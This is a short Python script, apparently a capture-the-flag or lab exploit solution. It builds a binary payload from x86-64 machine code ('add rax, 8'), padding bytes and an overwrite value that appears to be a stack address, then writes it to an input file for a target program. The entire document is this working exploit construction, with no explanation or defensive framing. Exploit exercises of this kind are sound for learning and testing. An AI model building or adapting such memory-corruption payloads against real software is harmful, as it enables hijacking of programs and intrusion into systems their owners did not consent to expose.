exploit = b'\x11\xe4\xff\xff\xff\x7f'
program = b'\x00\x01\x02\x03\x04'
# add rax, 8
program = b'\x48\x83\xc0\x08\x00' + b'\x48\x83\xc0\x08\x00'
offset = 4
payload = program + b'0'*offset + exploit
f = open('program_input', 'wb')
f.write(payload)